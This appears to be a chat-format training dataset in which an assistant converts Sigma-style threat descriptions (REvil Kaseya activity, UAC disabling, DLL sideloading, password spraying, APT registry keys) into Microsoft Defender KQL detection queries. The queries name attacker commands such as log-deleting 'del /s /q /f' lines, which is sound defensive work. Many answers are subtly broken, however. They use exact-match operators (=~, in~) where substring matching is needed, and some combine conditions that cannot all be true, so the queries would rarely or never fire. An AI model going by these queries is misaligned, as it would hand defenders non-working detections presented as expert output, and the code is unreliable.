{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an attempt to leverage dnscmd.exe to enumerate the DNS zones of a domain. DNS zones used to host the DNS records for a particular domain. Topic: proc_creation_win_dnscmd_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/enumrecords\", \"/enumzones\", \"/ZonePrint\", \"/info\")) and InitiatingProcessFolderPath =~ \"\\\\dnscmd.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects process execution from a fake recycle bin folder, often used to avoid security solution. Topic: proc_creation_win_susp_recycle_bin_fake_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath contains \"RECYCLERS.BIN\\\\\" or FolderPath contains \"RECYCLER.BIN\\\\\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects specific process behavior observed with Devil Bait samples Topic: proc_creation_win_malware_devil_bait_output_redirect"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"dir\", \"ipconfig /all\", \"systeminfo\", \"tasklist\")) and ((ProcessCommandLine endswith \".xml\" or ProcessCommandLine endswith \".txt\") and InitiatingProcessFileName =~ \"\\\\wscript.exe\" and ProcessCommandLine =~ \">>%APPDATA%\\\\Microsoft\\\\\" and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects registry key used by Leviathan APT in Malaysian focused campaign Topic: registry_event_apt_leviathan"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ntkd\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects process command line patterns and locations used by REvil group in Kaseya incident (can also match on other malware) Topic: proc_creation_win_apt_revil_kaseya"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"C:\\\\Windows\\\\cert.exe\", \"del /q /f c:\\\\kworking\\\\agent.crt\", \"Kaseya VSA Agent Hot-fix\", \"\\\\AppData\\\\Local\\\\Temp\\\\MsMpEng.exe\", \"rmdir /s /q %SystemDrive%\\\\inetpub\\\\logs\", \"c:\\\\kworking1\\\\agent.exe\", \"c:\\\\kworking1\\\\agent.crt\") or (ProcessCommandLine contains \"del /s /q /f %SystemDrive%\\\\\" and ProcessCommandLine contains \".log\")) or (FolderPath in~ (\"C:\\\\Windows\\\\MsMpEng.exe\", \"C:\\\\Windows\\\\cert.exe\", \"C:\\\\kworking\\\\agent.exe\", \"C:\\\\kworking1\\\\agent.exe\")) or (ProcessCommandLine in~ (\"del /s /q /f\", \"WebPages\\\\Errors\\\\webErrorLog.txt\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Suspicious behaviours related to an actor tracked by Microsoft as SOURGUM Topic: proc_creation_win_apt_sourgrum"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath contains \"windows\\\\system32\\\\Physmem.sys\" or FolderPath contains \"Windows\\\\system32\\\\ime\\\\SHARED\\\\WimBootConfigurations.ini\" or FolderPath contains \"Windows\\\\system32\\\\ime\\\\IMEJP\\\\WimBootConfigurations.ini\" or FolderPath contains \"Windows\\\\system32\\\\ime\\\\IMETC\\\\WimBootConfigurations.ini\") or (((FolderPath contains \"windows\\\\system32\\\\filepath2\" or FolderPath contains \"windows\\\\system32\\\\ime\") and ProcessCommandLine =~ \"reg add\") and (ProcessCommandLine in~ (\"HKEY_LOCAL_MACHINE\\\\software\\\\classes\\\\clsid\\\\{7c857801-7381-11cf-884d-00aa004b2e24}\\\\inprocserver32\", \"HKEY_LOCAL_MACHINE\\\\software\\\\classes\\\\clsid\\\\{cf4cc405-e2c5-4ddd-b3ce-5e7582d8c9fa}\\\\inprocserver32\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Uses the .NET InstallUtil.exe application in order to execute image without log Topic: proc_creation_win_instalutil_no_log_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath contains \"Microsoft.NET\\\\Framework\" and (ProcessCommandLine in~ (\"/logfile= \", \"/LogToConsole=false\")) and InitiatingProcessFolderPath =~ \"\\\\InstallUtil.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"dsquery.exe\" for domain trust discovery Topic: proc_creation_win_dsquery_domain_trust_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"trustedDomain\" and (FolderPath endswith \"\\\\dsquery.exe\" or ProcessVersionInfoOriginalFileName =~ \"dsquery.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of \"getcap\" binary. This is often used during recon activity to determine potential binaries that can be abused as GTFOBins or other. Topic: proc_creation_lnx_capa_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \" -r \" or ProcessCommandLine contains \" /r \" or ProcessCommandLine contains \" \u2013r \" or ProcessCommandLine contains \" \u2014r \" or ProcessCommandLine contains \" \u2015r \") and InitiatingProcessFolderPath =~ \"/getcap\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"tar.exe\" in order to extract compressed file.\nAdversaries may abuse various utilities in order to decompress data to avoid detection.\n Topic: proc_creation_win_tar_extraction"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"-x\" and (FolderPath endswith \"\\\\tar.exe\" or ProcessVersionInfoOriginalFileName =~ \"bsdtar\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may use port monitors to run an attacker supplied DLL during system boot for persistence or privilege escalation.\nA port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup.\n Topic: registry_set_add_port_monitor"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryValueData endswith \".dll\" and RegistryKey endswith \"\\\\Control\\\\Print\\\\Monitors*\") and (not(((RegistryValueData =~ \"cpwmon64_v40.dll\" and InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\System32\\\\spoolsv.exe\" and (InitiatingProcessAccountName in~ (\"AUTHORI\", \"AUTORI\")) and RegistryKey contains \"\\\\Control\\\\Print\\\\Monitors\\\\CutePDF Writer Monitor v4.0\\\\Driver\") or RegistryKey contains \"\\\\Control\\\\Print\\\\Monitors\\\\MONVNC\\\\Driver\" or (RegistryKey endswith \"Control\\\\Print\\\\Environments*\" and RegistryKey endswith \"\\\\Drivers*\" and RegistryKey contains \"\\\\VNC Printer\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an attacker tries to disable User Account Control (UAC) by setting the registry value \"EnableLUA\" to 0.\n Topic: registry_set_uac_disable"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\EnableLUA\" and RegistryValueData =~ \"DWORD (0x00000000)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of system utilities to discover system network connections Topic: proc_creation_lnx_system_network_connections_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath in~ (\"/who\", \"/w\", \"/last\", \"/lsof\", \"/netstat\")) and (not((InitiatingProcessCommandLine =~ \"/usr/bin/landscape-sysinfo\" and InitiatingProcessFolderPath =~ \"/who\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious process related to rasdial.exe Topic: proc_creation_win_rasdial_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"rasdial.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects OilRig registry persistence as reported by Nyotron in their March 2018 report Topic: registry_event_apt_oilrig_mar18"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\UMe\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\UT\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a new named pipe using the \"mkfifo\" utility Topic: proc_creation_lnx_mkfifo_named_pipe_creation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"/mkfifo\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect attacker collecting audio via SoundRecorder application. Topic: proc_creation_win_soundrecorder_audio_capture"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"/FILE\" and InitiatingProcessFolderPath =~ \"\\\\SoundRecorder.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious call to the \"ShellExec_RunDLL\" exported function of SHELL32.DLL through the ordinal number to launch other commands.\nAdversary might only use the ordinal number in order to bypass existing detection that alert on usage of ShellExec_RunDLL on CommandLine.\n Topic: proc_creation_win_rundll32_susp_shellexec_ordinal_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessCommandLine =~ \"SHELL32.DLL\" and (InitiatingProcessCommandLine in~ (\"#568\", \"#570\", \"#572\", \"#576\"))) and ((InitiatingProcessFolderPath in~ (\"\\\\bash.exe\", \"\\\\bitsadmin.exe\", \"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\curl.exe\", \"\\\\mshta.exe\", \"\\\\msiexec.exe\", \"\\\\msxsl.exe\", \"\\\\odbcconf.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\regsvr32.exe\", \"\\\\schtasks.exe\", \"\\\\wmic.exe\", \"\\\\wscript.exe\")) or ((InitiatingProcessCommandLine contains \"comspec\" or InitiatingProcessCommandLine contains \"iex\" or InitiatingProcessCommandLine contains \"Invoke-\" or InitiatingProcessCommandLine contains \"msiexec\" or InitiatingProcessCommandLine contains \"odbcconf\" or InitiatingProcessCommandLine contains \"regsvr32\") or (InitiatingProcessCommandLine contains \"\\\\Desktop\\\\\" or InitiatingProcessCommandLine contains \"\\\\ProgramData\\\\\" or InitiatingProcessCommandLine contains \"\\\\Temp\\\\\" or InitiatingProcessCommandLine contains \"\\\\Users\\\\Public\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects installation of new shim databases that try to patch sections of known processes for potential process injection or persistence. Topic: registry_set_persistence_shim_database_susp_application"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\Custom*\" and (RegistryKey endswith \"\\\\csrss.exe\" or RegistryKey endswith \"\\\\dllhost.exe\" or RegistryKey endswith \"\\\\explorer.exe\" or RegistryKey endswith \"\\\\RuntimeBroker.exe\" or RegistryKey endswith \"\\\\services.exe\" or RegistryKey endswith \"\\\\sihost.exe\" or RegistryKey endswith \"\\\\svchost.exe\" or RegistryKey endswith \"\\\\taskhostw.exe\" or RegistryKey endswith \"\\\\winlogon.exe\" or RegistryKey endswith \"\\\\WmiPrvSe.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects registry event related to the creation of a scheduled task used by Diamond Sleet APT during exploitation of Team City CVE-2023-42793 vulnerability\n Topic: registry_event_apt_diamond_sleet_scheduled_task"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Schedule\\\\TaskCache\\\\Tree*\" and RegistryKey contains \"Windows TeamCity Settings User Interface\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of winget to add new potentially suspicious download sources Topic: proc_creation_win_winget_add_susp_custom_source"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"source \", \"add \")) and (FolderPath endswith \"\\\\winget.exe\" or ProcessVersionInfoOriginalFileName =~ \"winget.exe\") and ProcessCommandLine matches regex \"://\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects modification of autostart extensibility point (ASEP) in registry. Topic: registry_set_asep_reg_keys_modification_internet_explorer"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"\\\\Software\\\\Wow6432Node\\\\Microsoft\\\\Internet Explorer\" or RegistryKey contains \"\\\\Software\\\\Microsoft\\\\Internet Explorer\") and (RegistryKey contains \"\\\\Toolbar\" or RegistryKey contains \"\\\\Extensions\" or RegistryKey contains \"\\\\Explorer Bars\") and (not((RegistryValueData =~ \"(Empty)\" or (RegistryKey contains \"\\\\Extensions\\\\{2670000A-7350-4f3c-8081-5663EE0C6C49}\" or RegistryKey contains \"\\\\Extensions\\\\{31D09BA0-12F5-4CCE-BE8A-2923E76605DA}\" or RegistryKey contains \"\\\\Extensions\\\\{789FE86F-6FC4-46A1-9849-EDE0DB0C95CA}\" or RegistryKey contains \"\\\\Extensions\\\\{A95fe080-8f5d-11d2-a20b-00aa003c157a}\") or (RegistryKey endswith \"\\\\Toolbar\\\\ShellBrowser\\\\ITBar7Layout\" or RegistryKey endswith \"\\\\Toolbar\\\\ShowDiscussionButton\" or RegistryKey endswith \"\\\\Toolbar\\\\Locked\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"SolidPDFCreator.dll\" Topic: image_load_side_load_solidpdfcreator"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\SolidPDFCreator.dll\" and (not(((FolderPath startswith \"C:\\\\Program Files (x86)\\\\SolidDocuments\\\\SolidPDFCreator\\\\\" or FolderPath startswith \"C:\\\\Program Files\\\\SolidDocuments\\\\SolidPDFCreator\\\\\") and InitiatingProcessFolderPath =~ \"\\\\SolidPDFCreator.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential container discovery via listing of certain kernel features in the \"/proc\" virtual filesystem Topic: proc_creation_lnx_susp_container_residence_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath in~ (\"awk\", \"/cat\", \"grep\", \"/head\", \"/less\", \"/more\", \"/nl\", \"/tail\")) and (ProcessCommandLine =~ \"/proc/2/\" or ((ProcessCommandLine endswith \"/cgroup\" or ProcessCommandLine endswith \"/sched\") and ProcessCommandLine =~ \"/proc/\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of NPPSpy hacktool that stores cleartext passwords of users that logged in to a local file Topic: file_event_win_hktl_nppspy"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\"\\\\NPPSpy.txt\", \"\\\\NPPSpy.dll\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the Dinject PowerShell cradle based on the specific flags Topic: proc_creation_win_hktl_dinjector"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\" /am51\", \" /password\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects browsers starting with the remote debugging flags. Which is a technique often used to perform browser injection attacks Topic: proc_creation_win_browsers_remote_debugging"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" --remote-debugging-\" or (ProcessCommandLine =~ \" -start-debugger-server\" and InitiatingProcessFolderPath =~ \"\\\\firefox.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when the enablement of developer features such as \"Developer Mode\" or \"Application Sideloading\". Which allows the user to install untrusted packages. Topic: registry_set_turn_on_dev_features"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\AppModelUnlock\" or RegistryKey endswith \"\\\\Policies\\\\Microsoft\\\\Windows\\\\Appx*\") and (RegistryKey endswith \"\\\\AllowAllTrustedApps\" or RegistryKey endswith \"\\\\AllowDevelopmentWithoutDevLicense\") and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious child processes of Excel which could be an indicator of lateral movement leveraging the \"ActivateMicrosoftApp\" Excel DCOM object.\n Topic: proc_creation_win_office_excel_dcom_lateral_movement"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessVersionInfoOriginalFileName in~ (\"foxprow.exe\", \"schdplus.exe\", \"winproj.exe\")) or (FolderPath endswith \"\\\\foxprow.exe\" or FolderPath endswith \"\\\\schdplus.exe\" or FolderPath endswith \"\\\\winproj.exe\")) and InitiatingProcessFileName =~ \"\\\\excel.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of findstr to identify and execute a lnk file as seen within the HHS redirect attack Topic: proc_creation_win_findstr_lnk"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\find.exe\" or FolderPath endswith \"\\\\findstr.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"FIND.EXE\", \"FINDSTR.EXE\"))) and (ProcessCommandLine endswith \".lnk\" or ProcessCommandLine endswith \".lnk\\\"\" or ProcessCommandLine endswith \".lnk'\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"wwlib.dll\" Topic: image_load_side_load_wwlib"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\wwlib.dll\" and (not(((FolderPath startswith \"C:\\\\Program Files (x86)\\\\Microsoft Office\\\\\" or FolderPath startswith \"C:\\\\Program Files\\\\Microsoft Office\\\\\") and InitiatingProcessFolderPath =~ \"\\\\winword.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects command line parameters used by ADCSPwn, a tool to escalate privileges in an active directory network by coercing authenticate from machine accounts and relaying to the certificate service Topic: proc_creation_win_hktl_adcspwn"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\" --adcs \", \" --port \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the \"userdel\" binary. Which is used to delete a user account and related files. This is sometimes abused by threat actors in order to cover their tracks Topic: proc_creation_lnx_userdel"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"/userdel\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of 7zip utilities (7z.exe, 7za.exe and 7zr.exe) to extract password protected zip files. Topic: proc_creation_win_7zip_password_extraction"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessVersionInfoFileDescription contains \"7-Zip\" or (FolderPath endswith \"\\\\7z.exe\" or FolderPath endswith \"\\\\7zr.exe\" or FolderPath endswith \"\\\\7za.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"7z.exe\", \"7za.exe\"))) and (ProcessCommandLine in~ (\" -p\", \" x \", \" -o\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the \"capsh\" utility to invoke a shell.\n Topic: proc_creation_lnx_capsh_shell_invocation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine endswith \" --\" and InitiatingProcessFolderPath =~ \"/capsh\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects possible password spraying attempts using Dsacls Topic: proc_creation_win_dsacls_password_spray"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/user:\", \"/passwd:\")) and (FolderPath endswith \"\\\\dsacls.exe\" or ProcessVersionInfoOriginalFileName =~ \"DSACLS.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Trojan loader activity as used by APT28 Topic: proc_creation_win_apt_sofacy"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine contains \".dat\\\",\" or (ProcessCommandLine endswith \".dll #1\" or ProcessCommandLine endswith \".dll\\\" #1\" or ProcessCommandLine endswith \".dll\\\",#1\")) and ((ProcessCommandLine in~ (\"%LOCALAPPDATA%\", \"\\\\AppData\\\\Local\\\\\")) and InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\")) and (not(ProcessCommandLine =~ \"\\\\AppData\\\\Local\\\\Temp\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the \"apt\" and \"apt-get\" commands to execute a shell or proxy commands.\nSuch behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.\n Topic: proc_creation_lnx_apt_shell_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"APT::Update::Pre-Invoke::=\" and (InitiatingProcessFolderPath in~ (\"/apt\", \"/apt-get\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of a specific binary based on filename and hash used by Lace Tempest to load additional malware as reported by SysAid Team Topic: proc_creation_win_apt_lace_tempest_loader_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where SHA256 startswith \"B5ACF14CDAC40BE590318DEE95425D0746E85B1B7B1CBD14DA66F21F2522BF4D\" or InitiatingProcessFolderPath =~ \":\\\\Program Files\\\\SysAidServer\\\\tomcat\\\\webapps\\\\usersfiles\\\\user.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of javascript code using \"mshta.exe\". Topic: proc_creation_win_mshta_javascript"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"javascript\" and (FolderPath endswith \"\\\\mshta.exe\" or ProcessVersionInfoOriginalFileName =~ \"MSHTA.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of TruffleSnout.exe an iterative AD discovery toolkit for offensive operators, situational awareness and targeted low noise enumeration. Topic: proc_creation_win_hktl_trufflesnout"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoOriginalFileName =~ \"TruffleSnout.exe\" or FolderPath endswith \"\\\\TruffleSnout.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the registration of a new ODBC driver where the driver is located in a potentially suspicious location Topic: registry_set_odbc_driver_registered_susp"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\SOFTWARE\\\\ODBC\\\\ODBCINST.INI*\" and (RegistryKey endswith \"\\\\Driver\" or RegistryKey endswith \"\\\\Setup\") and (RegistryValueData contains \":\\\\PerfLogs\\\\\" or RegistryValueData contains \":\\\\ProgramData\\\\\" or RegistryValueData contains \":\\\\Temp\\\\\" or RegistryValueData contains \":\\\\Users\\\\Public\\\\\" or RegistryValueData contains \":\\\\Windows\\\\Registration\\\\CRMLog\" or RegistryValueData contains \":\\\\Windows\\\\System32\\\\com\\\\dmp\\\\\" or RegistryValueData contains \":\\\\Windows\\\\System32\\\\FxsTmp\\\\\" or RegistryValueData contains \":\\\\Windows\\\\System32\\\\Microsoft\\\\Crypto\\\\RSA\\\\MachineKeys\\\\\" or RegistryValueData contains \":\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\\" or RegistryValueData contains \":\\\\Windows\\\\System32\\\\spool\\\\PRINTERS\\\\\" or RegistryValueData contains \":\\\\Windows\\\\System32\\\\spool\\\\SERVERS\\\\\" or RegistryValueData contains \":\\\\Windows\\\\System32\\\\Tasks_Migrated\\\\\" or RegistryValueData contains \":\\\\Windows\\\\System32\\\\Tasks\\\\Microsoft\\\\Windows\\\\SyncCenter\\\\\" or RegistryValueData contains \":\\\\Windows\\\\SysWOW64\\\\com\\\\dmp\\\\\" or RegistryValueData contains \":\\\\Windows\\\\SysWOW64\\\\FxsTmp\\\\\" or RegistryValueData contains \":\\\\Windows\\\\SysWOW64\\\\Tasks\\\\Microsoft\\\\Windows\\\\PLA\\\\System\\\\\" or RegistryValueData contains \":\\\\Windows\\\\SysWOW64\\\\Tasks\\\\Microsoft\\\\Windows\\\\SyncCenter\\\\\" or RegistryValueData contains \":\\\\Windows\\\\Tasks\\\\\" or RegistryValueData contains \":\\\\Windows\\\\Temp\\\\\" or RegistryValueData contains \":\\\\Windows\\\\Tracing\\\\\" or RegistryValueData contains \"\\\\AppData\\\\Local\\\\Temp\\\\\" or RegistryValueData contains \"\\\\AppData\\\\Roaming\\\\\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the certutil with the \"exportPFX\" flag which allows the utility to export certificates. Topic: proc_creation_win_certutil_export_pfx"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\certutil.exe\" or ProcessVersionInfoOriginalFileName =~ \"CertUtil.exe\") and (ProcessCommandLine contains \"-exportPFX \" or ProcessCommandLine contains \"/exportPFX \" or ProcessCommandLine contains \"\u2013exportPFX \" or ProcessCommandLine contains \"\u2014exportPFX \" or ProcessCommandLine contains \"\u2015exportPFX \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of \"query.exe\" a system binary to exfil information such as \"sessions\" and \"processes\" for later use Topic: proc_creation_win_query_session_exfil"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"session >\", \"process >\")) and InitiatingProcessFolderPath =~ \":\\\\Windows\\\\System32\\\\query.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a specific broken command that was used by Goofy-Guineapig as described by the NCSC report. Topic: proc_creation_win_malware_goofy_guineapig_broken_cmd"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"choice /t %d /d y /n >nul\""}]}
